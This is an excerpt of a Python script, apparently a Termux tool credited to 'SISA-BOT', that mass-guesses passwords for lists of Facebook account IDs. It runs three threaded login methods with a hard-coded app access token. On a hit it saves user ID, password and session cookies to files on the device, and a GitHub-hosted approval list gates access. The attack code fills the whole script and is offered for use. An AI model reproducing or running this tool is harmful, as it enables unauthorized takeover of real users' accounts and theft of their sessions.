...
logo = f"""     
 ...
 \x1b[38;5;48m██ ██   ██ ███████ ███████ ███████ ██   ██ 
\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\x1b[38;5;196m[\x1b[1;97m≣\x1b[38;5;196m]\033[38;5;46mOWNER      \x1b[1;97m● \033[38;5;46mSIAM AHMED
\x1b[38;5;196m[\x1b[1;97m≣\x1b[38;5;196m]\033[38;5;46mFACEBOOK   \x1b[1;97m● \033[38;5;46mAHMED SISA
\x1b[38;5;196m[\x1b[1;97m≣\x1b[38;5;196m]\033[38;5;46mGITHUB   \x1b[1;97m  ● \033[38;5;46mSISA-BOT
\x1b[38;5;196m[\x1b[1;97m≣\x1b[38;5;196m]\033[38;5;46mTOOLS      \x1b[1;97m● \033[38;5;46mPERSONAL
\x1b[38;5;196m[\x1b[1;97m≣\x1b[38;5;196m]\033[38;5;46mVERSION    \x1b[1;97m● \033[38;5;46mPRIVATE
\x1b[38;5;196m[\x1b[1;97m≣\x1b[38;5;196m]\033[38;5;46m[MY-WIFE]  \x1b[1;97m● \033[38;5;84m[\x1b[1;95mIREEN\033[38;5;84m]
\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
#-----------------------[ CLEAR-CODE ]-----------------------#
...
#-----------------------[ FILE-CODE ]-----------------------#
def file():
    fresh();print(" \x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFOR EXAMPLE: \x1b[38;5;46m/sdcard/IREESA.txt");line()
    ...
    IREESA_x=input("\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m]\x1b[38;5;46mCHOOSE : ")
    plist=[]
    fresh()
    try:
    ...
    with tred(max_workers=30) as IREESA:
        fresh()
        tl = str(len(fo))
        print(f' \x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mTOTAL IDS \x1b[1;97m● {tl}')
        print(f' \x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mMETHOD \x1b[1;97m● \x1b[1;97mM{IREESA_x}\x1b[38;5;46m')
        ...
        for user in fo:
            ...
            passlist = plist
            if IREESA_x =='1':
                IREESA.submit(api1,ids,names,passlist)
            if IREESA_x =='2':
                IREESA.submit(api2,ids,names,passlist)
            if IREESA_x =='3':
                IREESA.submit(api3,ids,names,passlist)
#-----------------------[ FILE-METHOD-CODE ]-----------------------#
def api1(ids,names,passlist):
    try:
        global ok,loop,sim_id
        sys.stdout.write(f'\r\x1b[38;5;196m [\x1b[38;5;46mIREESA\x1b[1;97m-\x1b[38;5;46mM1\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46m%s\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46mOK:%s\x1b[38;5;196m]'%(loop,len(oks)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
        ...
        for pw in passlist:
            ...
            if 'session_key' in po:
                    ...
                    print('\r\r\x1b[38;5;196m[\x1b[38;5;46mIREESA\x1b[1;97m-\x1b[38;5;46m💚\x1b[38;5;196m]\x1b[38;5;46m '+uid+'|'+pas)
                    #line()
                    file_path = os.path.join(folder_path, 'IREESA-FILE-OK.txt')
                    open('/sdcard/IREESA/IREESA-FILE-OK-COOKIE-M1.txt','a').write(uid+'|'+pas+' >>> '+cookie+'\n')
                    ...
                    open('/sdcard/IREESA-CP.txt','a').write(uid+'|'+pas+'\n')
                    with open(file_path, 'a') as file:
                        file.write(uid+'|'+pas+'\n')
                    cps.append(uid)
                    break
...
def api2(ids,names,passlist):
    try:
        global ok,loop,sim_id
        sys.stdout.write(f'\r\x1b[38;5;196m [\x1b[38;5;46mIREESA\x1b[1;97m-\x1b[38;5;46mM2\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46m%s\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46mOK:%s\x1b[38;5;196m]'%(loop,len(oks)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
        ...
        for pw in passlist:
            ...
            if 'session_key' in po:
                    ...
                    #line()
                    file_path = os.path.join(folder_path, 'IREESA-FILE-OK.txt')
                    open('/sdcard/IREESA/IREESA-FILE-OK-COOKIE-M2.txt','a').write(uid+'|'+pas+' >>> '+cookie+'\n')
                    with open(file_path, 'a') as file:
                        file.write(uid+'|'+pas+'\n')
                    oks.append(uid)
                    break
...
def api3(ids,names,passlist):
    try:
        global ok,loop,sim_id
        sys.stdout.write(f'\r\x1b[38;5;196m [\x1b[38;5;46mIREESA\x1b[1;97m-M3\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46m%s\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46mOK:%s\x1b[38;5;196m]'%(loop,len(oks)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
        ...
        for pw in passlist:
            ...
            if 'session_key' in po:
                    ...
                    #line()
                    file_path = os.path.join(folder_path, 'IREESA-FILE-OK.txt')
                    open('/sdcard/IREESA/IREESA-FILE-OK-COOKIE-M3.txt','a').write(uid+'|'+pas+' >>> '+cookie+'\n')
                    with open(file_path, 'a') as file:
                        file.write(uid+'|'+pas+'\n')
                    oks.append(uid)
                    break
...
def rndmx(ids,pasx,tl):
        global loop,ok
        sys.stdout.write(f'\r{w} \x1b[38;5;196m[\x1b[38;5;46mIREESA\x1b[1;97m-\x1b[38;5;146mXD\x1b[38;5;196m] [{loop}] [{len(ok)}|{len(cp)}]');sys.stdout.flush()
        try:
                for pas in pasx:
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        ...
                        if 'session_key' in po:
                                ...
                                try:
                                    ...
                                    if 'Photoshop' in res:
                                        print(f'\r{g} \x1b[38;5;196m[\x1b[38;5;46mIREESA\x1b[1;97m-\x1b[38;5;46m💚\x1b[38;5;196m]\x1b[38;5;46m {str(uid)} \x1b[1;97m● \x1b[38;5;46m{pas} ')
                                        coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                        if 'y' in cokix:print(f'\r{g} (Kid) : {coki} ')
                                        open('/sdcard/IREESA-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                        ok.append(str(uid))
                                        break
                                    else:break
                                except:break
                                ...
                                open('/sdcard/IREESA-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                cp.append(str(uid))
                                break
                        else:continue
                loop+=1
...
def aproval():
    ...
    id = "".join(uuid)
    try:
        url_apv = requests.get('https://github.com/SISA-BOT/SiSa-Back/blob/main/approve.txt').text
        if id in url_apv:
